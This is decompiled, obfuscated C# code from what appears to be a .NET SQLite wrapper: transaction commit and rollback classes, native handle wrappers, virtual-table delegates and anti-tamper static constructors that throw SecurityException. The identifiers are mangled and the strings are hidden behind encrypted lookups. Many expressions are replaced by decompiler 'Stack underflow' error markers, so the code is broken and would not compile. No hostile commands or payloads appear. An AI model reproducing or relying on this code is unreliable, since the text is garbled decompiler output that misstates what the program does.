			//IL_0027: Incompatible stack heights: 0 vs 2
			try
			{
				if (!((_007F)/*Error near IL_0007: Stack underflow*/)._0001 && (int)/*Error near IL_000d: Stack underflow*/ != 0)
				{
					_ = 0;
					if (global::_0011._0018._0001((byte)/*Error near IL_0015: Stack underflow*/ != 0, (global::_0003._0016)/*Error near IL_0015: Stack underflow*/))
					{
						_0002(_0002: false);
					}
				}
			}
			finally
			{
				base.Dispose(disposing);
				this._0001 = true;
			}
		}

		public override void Commit()
		{
			//IL_007c: Incompatible stack heights: 0 vs 1
			//IL_008c: Incompatible stack heights: 0 vs 2
			global::_0011._0018._0001((_007F)/*Error near IL_0086: Stack underflow*/);
			_ = 1;
			global::_0011._0018._0001((byte)/*Error near IL_0012: Stack underflow*/ != 0, (global::_0003._0016)/*Error near IL_0012: Stack underflow*/);
			if (base._0001._0011 - 1 == 0)
			{
				_001C obj = global::_0011._0018._0001(base._0001);
				try
				{
					_0082_0003._007E_0011_0007(obj, global::_0080._0014._0001(107375951));
					global::_001A._007E_001A_0003(obj);
				}
				finally
				{
					if (obj != null)
					{
						global::_0008._007E_0098(obj);
					}
				}
			}
			base._0001._0011--;
			base._0001 = null;
		}

		protected override void _0001(bool _0002)
		{
			//IL_0017: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Expected I4, but got Unknown
			//IL_009d: Incompatible stack heights: 0 vs 1
			//IL_00a3: Incompatible stack heights: 0 vs 2
			//IL_00a9: Incompatible stack heights: 0 vs 1
			int num = ((global::_0003._0016)/*Error near IL_000a: Stack underflow*/)._0001._0011;
			_003F val = /*Error near IL_0018: Stack underflow*/+ 1;
			((global::_0017._0080)/*Error near IL_001d: Stack underflow*/)._0011 = (int)val;
			if ((int)/*Error near IL_0024: Stack underflow*/ != 0)
			{
				return;
			}
			try
			{
				_001C obj = global::_0011._0018._0001(base._0001);
				try
				{
					if (!_0002)
					{
						_0082_0003._007E_0011_0007(obj, global::_0080._0014._0001(107375938));
					}
					else
					{
						_0082_0003._007E_0011_0007(obj, global::_0080._0014._0001(107375913));
					}
					global::_001A._007E_001A_0003(obj);
				}
				finally
				{
					if (obj != null)
					{
						global::_0008._007E_0098(obj);
					}
				}
			}
			catch (SQLiteException)
			{
				base._0001._0011--;
				base._0001 = null;
				throw;
			}
		}

		protected override void _0002(bool _0002)
		{
			//IL_005b: Incompatible stack heights: 0 vs 1
			//IL_0062: Incompatible stack heights: 0 vs 1
			Interlocked.Exchange(ref ((global::_0003._0016)/*Error near IL_0007: Stack underflow*/)._0001, null);
			global::_0017._0080 obj = (global::_0017._0080)/*Error near IL_0065: Stack underflow*/;
			if (obj == null)
			{
				return;
			}
			try
			{
				_001C obj2 = global::_0011._0018._0001(obj);
				try
				{
					_0082_0003._007E_0011_0007(obj2, global::_0080._0014._0001(107375904));
					global::_001A._007E_001A_0003(obj2);
				}
				finally
				{
					if (obj2 != null)
					{
						global::_0008._007E_0098(obj2);
					}
				}
			}
			catch
			{
				if (_0002)
				{
					throw;
				}
			}
			obj._0011 = 0;
		}
	}
}
namespace _0016
{
	internal sealed class _001D : global::_0010._007F
	{
		private new int m__0001;

		private new string m__0001;

		internal new bool _0001;

		internal _001D(global::_0017._0080 _001B_0013_0006, bool _009E_0019_0006)
			: base(_001B_0013_0006, _009E_0019_0006)
		{
		}

		protected override void Dispose(bool _0002)
		{
			//IL_0021: Incompatible stack heights: 0 vs 1
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_0027: Incompatible stack heights: 0 vs 2
			try
			{
				if (!((_001D)/*Error near IL_0007: Stack underflow*/)._0001 && (int)/*Error near IL_000d: Stack underflow*/ != 0)
				{
					_ = 0;
					if (global::_0011._0018._0001((byte)/*Error near IL_0015: Stack underflow*/ != 0, (global::_0003._0016)/*Error near IL_0015: Stack underflow*/))
					{
						this._0002(_0002: false);
					}
				}
			}
			finally
			{
				base.Dispose(_0002);
				this._0001 = true;
			}
		}

		public override void Commit()
		{
			//IL_00fe: Incompatible stack heights: 0 vs 1
			//IL_010e: Incompatible stack heights: 0 vs 2
			if (0 == 0)
			{
				global::_0011._0018._0001((_001D)/*Error near IL_0108: Stack underflow*/);
			}
			_ = 1;
			global::_0011._0018._0001((byte)/*Error near IL_0017: Stack underflow*/ != 0, (global::_0003._0016)/*Error near IL_0017: Stack underflow*/);
			if (this.m__0001 == 0)
			{
				global::_0010._001C obj = global::_0011._0018._0001(((global::_0003._0016)this)._0001);
				try
				{
					_0082_0003._007E_0011_0007(obj, _0080._0014._0001(107375951));
					global::_001A._007E_001A_0003(obj);
				}
				finally
				{
					if (obj != null)
					{
						global::_0008._007E_0098(obj);
					}
				}
				((global::_0003._0016)this)._0001._0011 = 0;
				((global::_0003._0016)this)._0001 = null;
				return;
			}
			global::_0010._001C obj2 = global::_0011._0018._0001(((global::_0003._0016)this)._0001);
			try
			{
				if (global::_001C._0096_0003(this.m__0001))
				{
					throw new SQLiteException(_0080._0014._0001(107375923));
				}
				_0082_0003._007E_0011_0007(obj2, _0008_0002._0007_0005(_0080._0014._0001(107375334), this.m__0001));
				global::_001A._007E_001A_0003(obj2);
			}
			finally
			{
				if (obj2 != null)
				{
					global::_0008._007E_0098(obj2);
				}
			}
			((global::_0003._0016)this)._0001._0011--;
			((global::_0003._0016)this)._0001 = null;
		}

		protected override void _0001(bool _0002)
		{
			//IL_012e: Incompatible stack heights: 0 vs 1
			//IL_013a: Incompatible stack heights: 0 vs 1
			global::_0017._0080 obj = ((global::_0003._0016)/*Error near IL_000a: Stack underflow*/)._0001;
			int num = obj._0011;
			int num2 = default(int);
			if (0 == 0)
			{
				num2 = num;
			}
			obj._0011 = num + 1;
			int num3 = num2;
			if ((int)/*Error near IL_002b: Stack underflow*/ == 0)
			{
				try
				{
					global::_0010._001C obj2 = global::_0011._0018._0001(((global::_0003._0016)this)._0001);
					try
					{
						if (!_0002)
						{
							_0082_0003._007E_0011_0007(obj2, _0080._0014._0001(107375938));
						}
						else
						{
							_0082_0003._007E_0011_0007(obj2, _0080._0014._0001(107375913));
						}
						global::_001A._007E_001A_0003(obj2);
						this.m__0001 = num3;
						return;
					}
					finally
					{
						if (obj2 != null)
						{
							global::_0008._007E_0098(obj2);
						}
					}
				}
				catch (SQLiteException)
				{
					((global::_0003._0016)this)._0001._0011--;
					((global::_0003._0016)this)._0001 = null;
					throw;
				}
			}
			try
			{
				global::_0010._001C obj3 = global::_0011._0018._0001(((global::_0003._0016)this)._0001);
				try
				{
					this.m__0001 = global::_0011._0018._0001(this);
					_0082_0003._007E_0011_0007(obj3, _0008_0002._0007_0005(_0080._0014._0001(107375349), this.m__0001));
					global::_001A._007E_001A_0003(obj3);
					this.m__0001 = num3;
				}
				finally
				{
					if (obj3 != null)
					{
						global::_0008._007E_0098(obj3);
					}
				}
			}
			catch (SQLiteException)
			{
				((global::_0003._0016)this)._0001._0011--;
				((global::_0003._0016)this)._0001 = null;
				throw;
			}
		}

		protected override void _0002(bool _0002)
		{
			//IL_00fa: Incompatible stack heights: 0 vs 1
			//IL_0104: Incompatible stack heights: 0 vs 1
			Interlocked.Exchange(ref ((global::_0003._0016)/*Error near IL_000a: Stack underflow*/)._0001, null);
			global::_0017._0080 obj;
			if (7u != 0)
			{
				obj = (global::_0017._0080)/*Error near IL_010a: Stack underflow*/;
			}
			if (obj == null)
			{
				return;
			}
			if (this.m__0001 == 0)
			{
				try
				{
					global::_0010._001C obj2 = global::_0011._0018._0001(obj);
					try
					{
						_0082_0003._007E_0011_0007(obj2, _0080._0014._0001(107375904));
						global::_001A._007E_001A_0003(obj2);
					}
					finally
					{
						if (obj2 != null)
						{
							global::_0008._007E_0098(obj2);
						}
					}
					obj._0011 = 0;
					return;
				}
				catch
				{
					if (_0002)
					{
						throw;
					}
					return;
				}
			}
			try
			{
				global::_0010._001C obj4 = global::_0011._0018._0001(obj);
				try
				{
					if (global::_001C._0096_0003(this.m__0001))
					{
						throw new SQLiteException(_0080._0014._0001(107375296));
					}
					_0082_0003._007E_0011_0007(obj4, _0008_0002._0007_0005(_0080._0014._0001(107375247), this.m__0001));
					global::_001A._007E_001A_0003(obj4);
				}
				finally
				{
					if (obj4 != null)
					{
						global::_0008._007E_0098(obj4);
					}
				}
				obj._0011--;
			}
			catch
			{
				if (_0002)
				{
					throw;
				}
			}
		}

		static _001D()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0017
{
	internal static class _0083
	{
		internal static readonly object _0001;

		internal static readonly string _0001;

		internal static bool? _0001;

		static _0083()
		{
			//IL_0024: Incompatible stack heights: 0 vs 1
			//IL_002b: Incompatible stack heights: 0 vs 1
			new object();
			_0083._0001 = (object)/*Error near IL_0007: Stack underflow*/;
			global::_0080._0014._0001(107375254);
			_0083._0001 = (string)/*Error near IL_0013: Stack underflow*/;
			_0001 = null;
		}
	}
}
namespace _0013
{
	internal static class _0018
	{
		internal delegate IntPtr _0001(string fileName);

		static _0018()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0006
{
	[SuppressUnmanagedCodeSecurity]
	internal static class _001B
	{
		internal const int _0001 = 1;

		internal const int _0002 = 2;

		internal const int _0003 = 256;

		internal const int _0004 = 0;

		internal const int _0005 = 258;
	}
}
namespace _0011
{
	[SuppressUnmanagedCodeSecurity]
	internal static class _0017
	{
		static _0017()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (_0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0017
{
	[SuppressUnmanagedCodeSecurity]
	internal static class _0084
	{
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate global::_0080._0017 _0001(IntPtr pDb, IntPtr pAux, int argc, IntPtr argv, ref IntPtr pVtab, ref IntPtr pError);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate global::_0080._0017 _0002(IntPtr pDb, IntPtr pAux, int argc, IntPtr argv, ref IntPtr pVtab, ref IntPtr pError);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate global::_0080._0017 _0003(IntPtr pVtab, IntPtr pIndex);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate global::_0080._0017 _0004(IntPtr pVtab);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate global::_0080._0017 _0005(IntPtr pVtab);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate global::_0080._0017 _0006(IntPtr pVtab, ref IntPtr pCursor);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate global::_0080._0017 _0007(IntPtr pCursor);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate global::_0080._0017 _0008(IntPtr pCursor, int idxNum, IntPtr idxStr, int argc, IntPtr argv);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate global::_0080._0017 _000E(IntPtr pCursor);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate int _000F(IntPtr pCursor);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate global::_0080._0017 _0010(IntPtr pCursor, IntPtr pContext, int index);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate global::_0080._0017 _0011(IntPtr pCursor, ref long rowId);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate global::_0080._0017 _0012(IntPtr pVtab, int argc, IntPtr argv, ref long rowId);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate global::_0080._0017 _0013(IntPtr pVtab);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate global::_0080._0017 _0014(IntPtr pVtab);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate global::_0080._0017 _0015(IntPtr pVtab);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate global::_0080._0017 _0016(IntPtr pVtab);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate int _0017(IntPtr pVtab, int nArg, IntPtr zName, ref global::_0019._001F callback, ref IntPtr pUserData);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate global::_0080._0017 _0018(IntPtr pVtab, IntPtr zNew);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate global::_0080._0017 _0019(IntPtr pVtab, int iSavepoint);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate global::_0080._0017 _001A(IntPtr pVtab, int iSavepoint);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate global::_0080._0017 _001B(IntPtr pVtab, int iSavepoint);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate void _001C(IntPtr pClientData);

		internal struct _001D
		{
			public int _0001;

			public _0001 _0001;

			public _0002 _0001;

			public _0003 _0001;

			public _0004 _0001;

			public _0005 _0001;

			public _0006 _0001;

			public _0007 _0001;

			public _0008 _0001;

			public _000E _0001;

			public _000F _0001;

			public _0010 _0001;

			public _0011 _0001;

			public _0012 _0001;

			public _0013 _0001;

			public _0014 _0001;

			public _0015 _0001;

			public _0016 _0001;

			public _0017 _0001;

			public _0018 _0001;

			public _0019 _0001;

			public _001A _0001;

			public _001B _0001;
		}

		internal struct _001E
		{
			public IntPtr _0001;

			public int _0001;

			public IntPtr _0002;
		}

		internal struct _001F
		{
			public IntPtr _0001;
		}

		internal struct _007F
		{
			public int _0001;

			public global::_0019._0080 _0001;

			public byte _0001;

			public int _0002;

			public _007F(global::_0003._0017 _0014_0081_0006)
			{
				this = default(_007F);
				if (_0014_0081_0006 != null)
				{
					this._0001 = _0014_0081_0006._0001;
					this._0001 = _0014_0081_0006._0001;
					_0001 = _0014_0081_0006._0001;
					_0002 = _0014_0081_0006._0002;
				}
			}
		}

		internal struct _0080
		{
			public int _0001;

			public byte _0001;

			public _0080(global::_0003._0018 _0016_0081_0006)
			{
				this = default(_0080);
				if (_0016_0081_0006 != null)
				{
					this._0001 = _0016_0081_0006._0001;
					_0001 = _0016_0081_0006._0001;
				}
			}
		}

		internal struct _0081
		{
			public int _0001;

			public byte _0001;

			public _0081(global::_0001._0080 _0018_0081_0006)
			{
				this = default(_0081);
				if (_0018_0081_0006 != null)
				{
					this._0001 = _0018_0081_0006._0001;
					_0001 = _0018_0081_0006._0001;
				}
			}
		}

		internal struct _0082
		{
			public int _0001;

			public IntPtr _0001;

			public int _0002;

			public IntPtr _0002;

			public IntPtr _0003;

			public int _0003;

			public string _0001;

			public int _0004;

			public int _0005;

			public double _0001;

			public long _0001;

			public global::_001A._0019 _0001;

			public long _0002;
		}

		internal const string _0001 = "SQLite.Interop.dll";

		internal static readonly string _0002;

		private static readonly string m__0003;

		internal static readonly string _0004;

		internal static readonly string _0005;

		internal static readonly string _0006;

		internal static readonly string _0007;

		internal static readonly object _0001;

		internal static Dictionary<string, string> _0001;

		internal static string _0008;

		internal static bool _0001;

		internal static string _000E;

		internal static bool _0002;

		internal static readonly string _000F;

		internal static string _0010;

		internal static IntPtr _0001;

		static _0084()
		{
			//IL_00b1: Incompatible stack heights: 0 vs 1
			//IL_00bb: Incompatible stack heights: 0 vs 1
			//IL_00c5: Incompatible stack heights: 0 vs 3
			global::_0080._0014._0001(107375205);
			_0084._0002 = (string)/*Error near IL_000f: Stack underflow*/;
			global::_0080._0014._0001(107375228);
			_0084.m__0003 = (string)/*Error near IL_001e: Stack underflow*/;
			_ = global::_0011._008E_0002;
			_ = global::_0002._007E_007F;
			_0091._0080_0004(typeof(_0084).TypeHandle);
			string text = /*Error near IL_003c: Stack underflow*/((object)/*Error near IL_003c: Stack underflow*/);
			string text2 = _0084._0002;
			string text3 = _0084.m__0003;
			_0084._0004 = /*Error near IL_004b: Stack underflow*/(text, text2, text3);
			_0084._0005 = global::_0080._0014._0001(107375183);
			_0084._0006 = global::_0080._0014._0001(107375166);
			_0084._0007 = global::_0080._0014._0001(107375121);
			_0084._0001 = new object();
			_0084._000F = global::_0080._0014._0001(107375556);
			_0084._0010 = null;
			_0084._0001 = IntPtr.Zero;
			global::_0011._0018._0001();
		}

		internal unsafe static int _0001(string _0002, ref List<string> _0003)
		{
			//IL_00c3: Incompatible stack heights: 0 vs 1
			//IL_00c9: Incompatible stack heights: 0 vs 1
			int num = 0;
			if (*(object*)(nint)/*Error near IL_000c: Stack underflow*/ == null)
			{
				List<string> list = new List<string>();
				*(List<string>*)(nint)/*Error near IL_0019: Stack underflow*/ = list;
			}
			lock (_0084._0001)
			{
				if (!string.IsNullOrEmpty(_0002))
				{
					if (_0084._0001 != null)
					{
						foreach (KeyValuePair<string, string> item in _0084._0001)
						{
							if (Directory.Exists(global::_0011._0018._0001(_0002, item.Key)))
							{
								_0003.Add(item.Key);
								num++;
							}
							string value = item.Value;
							if (value != null && Directory.Exists(global::_0011._0018._0001(_0002, value)))
							{
								_0003.Add(value);
								num++;
							}
						}
						return num;
					}
					return num;
				}
				return num;
			}
		}
	}
}
namespace _000E
{
	internal sealed class _001F : CriticalHandle
	{
		internal bool _0001;

		public bool OwnHandle => ((_001F)/*Error near IL_0007: Stack underflow*/)._0001;

		public override bool IsInvalid
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = _0090_0002._009A_0005;
				IntPtr intPtr = ((CriticalHandle)/*Error near IL_000c: Stack underflow*/).handle;
				IntPtr zero = IntPtr.Zero;
				/*Error near IL_001c: Stack underflow*/(intPtr, zero);
				return (byte)/*Error near IL_0014: Stack underflow*/ != 0;
			}
		}

		[SpecialName]
		public static IntPtr _0001(_001F _0002)
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				return ((CriticalHandle)/*Error near IL_000b: Stack underflow*/).handle;
			}
			return IntPtr.Zero;
		}

		internal _001F(IntPtr _0091_0016_0006, bool _000F_0017_0006)
			: this(_000F_0017_0006)
		{
			this._0001 = _000F_0017_0006;
			SetHandle(_0091_0016_0006);
		}

		private _001F(bool _000F_0017_0006)
			: base(IntPtr.Zero)
		{
		}

		protected override bool _0001()
		{
			//IL_003b: Incompatible stack heights: 0 vs 2
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_0058: Incompatible stack heights: 0 vs 1
			if (!((_001F)/*Error near IL_0007: Stack underflow*/)._0001)
			{
				return true;
			}
			try
			{
				_ = _0087_0007._001D_0011;
				ref IntPtr reference = ref ((CriticalHandle)/*Error near IL_0017: Stack underflow*/).handle;
				IntPtr zero = IntPtr.Zero;
				/*Error near IL_0042: Stack underflow*/(ref reference, zero);
				IntPtr intPtr = (IntPtr)/*Error near IL_001f: Stack underflow*/;
				if (_0090_0002._0099_0005(intPtr, IntPtr.Zero))
				{
					global::_0011._0018._0001(this, intPtr);
				}
			}
			catch (SQLiteException)
			{
			}
			finally
			{
				global::_0008._0008_0002(this);
			}
			return true;
		}

		static _001F()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0001
{
	internal sealed class _001F : CriticalHandle
	{
		private global::_000E._001F m__0001;

		public override bool IsInvalid
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = _0090_0002._009A_0005;
				IntPtr intPtr = ((CriticalHandle)/*Error near IL_000c: Stack underflow*/).handle;
				IntPtr zero = IntPtr.Zero;
				/*Error near IL_001c: Stack underflow*/(intPtr, zero);
				return (byte)/*Error near IL_0014: Stack underflow*/ != 0;
			}
		}

		[SpecialName]
		public static IntPtr _0001(_001F _0002)
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				return ((CriticalHandle)/*Error near IL_000b: Stack underflow*/).handle;
			}
			return IntPtr.Zero;
		}

		internal _001F(global::_000E._001F _0002_0014_0006, IntPtr _0008_0014_0006)
			: this()
		{
			this.m__0001 = _0002_0014_0006;
			SetHandle(_0008_0014_0006);
		}

		private _001F()
			: base(IntPtr.Zero)
		{
		}

		protected override bool _0001()
		{
			//IL_0036: Incompatible stack heights: 0 vs 2
			//IL_003d: Incompatible stack heights: 0 vs 1
			try
			{
				_ = _0087_0007._001D_0011;
				ref IntPtr reference = ref ((CriticalHandle)/*Error near IL_000c: Stack underflow*/).handle;
				IntPtr zero = IntPtr.Zero;
				/*Error near IL_003d: Stack underflow*/(ref reference, zero);
				IntPtr intPtr = (IntPtr)/*Error near IL_0040: Stack underflow*/;
				if (_0090_0002._0099_0005(intPtr, IntPtr.Zero))
				{
					global::_0011._0018._0001(this.m__0001, intPtr);
				}
			}
			catch (SQLiteException)
			{
			}
			finally
			{
				global::_0008._0008_0002(this);
			}
			return true;
		}
	}
}
namespace _0015
{
	internal sealed class _0017 : CriticalHandle
	{
		private global::_000E._001F m__0001;

		public override bool IsInvalid
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = _0090_0002._009A_0005;
				IntPtr intPtr = ((CriticalHandle)/*Error near IL_000c: Stack underflow*/).handle;
				IntPtr zero = IntPtr.Zero;
				/*Error near IL_001c: Stack underflow*/(intPtr, zero);
				return (byte)/*Error near IL_0014: Stack underflow*/ != 0;
			}
		}

		[SpecialName]
		public static IntPtr _0001(_0017 _0002)
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				return ((CriticalHandle)/*Error near IL_000b: Stack underflow*/).handle;
			}
			return IntPtr.Zero;
		}

		internal _0017(global::_000E._001F _0002_0014_0006, IntPtr _0089_0016_0006)
			: this()
		{
			this.m__0001 = _0002_0014_0006;
			SetHandle(_0089_0016_0006);
		}

		private _0017()
			: base(IntPtr.Zero)
		{
		}

		protected override bool _0001()
		{
			//IL_0036: Incompatible stack heights: 0 vs 2
			//IL_003d: Incompatible stack heights: 0 vs 1
			try
			{
				_ = _0087_0007._001D_0011;
				ref IntPtr reference = ref ((CriticalHandle)/*Error near IL_000c: Stack underflow*/).handle;
				IntPtr zero = IntPtr.Zero;
				/*Error near IL_003d: Stack underflow*/(ref reference, zero);
				IntPtr intPtr = (IntPtr)/*Error near IL_0040: Stack underflow*/;
				if (_0090_0002._0099_0005(intPtr, IntPtr.Zero))
				{
					global::_0011._0018._0001(intPtr, this.m__0001);
				}
			}
			catch (SQLiteException)
			{
			}
			finally
			{
				global::_0008._0008_0002(this);
			}
			return true;
		}

		static _0017()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0010
{
	internal sealed class _0080 : CriticalHandle
	{
		private global::_000E._001F m__0001;

		public override bool IsInvalid
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = _0090_0002._009A_0005;
				IntPtr intPtr = ((CriticalHandle)/*Error near IL_000c: Stack underflow*/).handle;
				IntPtr zero = IntPtr.Zero;
				/*Error near IL_001c: Stack underflow*/(intPtr, zero);
				return (byte)/*Error near IL_0014: Stack underflow*/ != 0;
			}
		}

		[SpecialName]
		public static IntPtr _0001(_0080 _0002)
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0)
			{
				return ((CriticalHandle)/*Error near IL_000b: Stack underflow*/).handle;
			}
			return IntPtr.Zero;
		}

		internal _0080(global::_000E._001F _0002_0014_0006, IntPtr _0092_0016_0006)
			: this()
		{
			this.m__0001 = _0002_0014_0006;
			SetHandle(_0092_0016_0006);
		}

		private _0080()
			: base(IntPtr.Zero)
		{
		}

		protected override bool _0001()
		{
			//IL_0036: Incompatible stack heights: 0 vs 2
			//IL_003d: Incompatible stack heights: 0 vs 1
			try
			{
				_ = _0087_0007._001D_0011;
				ref IntPtr reference = ref ((CriticalHandle)/*Error near IL_000c: Stack underflow*/).handle;
				IntPtr zero = IntPtr.Zero;
				/*Error near IL_003d: Stack underflow*/(ref reference, zero);
				IntPtr intPtr = (IntPtr)/*Error near IL_0040: Stack underflow*/;
				if (_0090_0002._0099_0005(intPtr, IntPtr.Zero))
				{
					global::_0011._0018._0001(intPtr, this.m__0001);
				}
			}
			catch (SQLiteException)
			{
			}
			finally
			{
				global::_0008._0008_0002(this);
			}
			return true;
		}
	}
}
namespace _0005
{
	[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
	[DebuggerNonUserCode]
	[CompilerGenerated]
	internal sealed class _0019
	{
		private static ResourceManager _0001;

		private static CultureInfo _0001;

		[EditorBrowsable(EditorBrowsableState.Advanced)]
		internal static ResourceManager ResourceManager
		{
			get
			{
				//IL_0043: Incompatible stack heights: 0 vs 1
				//IL_004a: Incompatible stack heights: 0 vs 1
				//IL_0051: Incompatible stack heights: 0 vs 2
				_008B_0005._001A_000F(_0019._0001, null);
				if ((int)/*Error near IL_000f: Stack underflow*/ != 0)
				{
					_0080._0014._0001(107375523);
					_ = _0092._007E_0081_0004;
					_0091._0080_0004(typeof(_0019).TypeHandle);
					ResourceManager resourceManager = (_0019._0001 = new ResourceManager(assembly: /*Error near IL_002c: Stack underflow*/((object)/*Error near IL_002c: Stack underflow*/), baseName: (string)/*Error near IL_0031: Stack underflow*/));
				}
				return _0019._0001;
			}
		}

		[EditorBrowsable(EditorBrowsableState.Advanced)]
		internal static CultureInfo Culture
		{
			get
			{
				return _0001;
			}
			set
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				_0001 = (CultureInfo)/*Error near IL_0007: Stack underflow*/;
			}
		}

		internal static string DataTypes
		{
			get
			{
				//IL_001b: Incompatible stack heights: 0 vs 2
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 1
				_ = _0088_0007._007E_001E_0011;
				_ = ResourceManager;
				_0080._0014._0001(107350540);
				CultureInfo cultureInfo = _0001;
				/*Error near IL_0029: Stack underflow*/((object)/*Error near IL_0029: Stack underflow*/, (string)/*Error near IL_0029: Stack underflow*/, cultureInfo);
				return (string)/*Error near IL_0016: Stack underflow*/;
			}
		}

		internal static string Keywords
		{
			get
			{
				//IL_001b: Incompatible stack heights: 0 vs 2
				//IL_0022: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 1
				_ = _0088_0007._007E_001E_0011;
				_ = ResourceManager;
				_0080._0014._0001(107375550);
				CultureInfo cultureInfo = _0001;
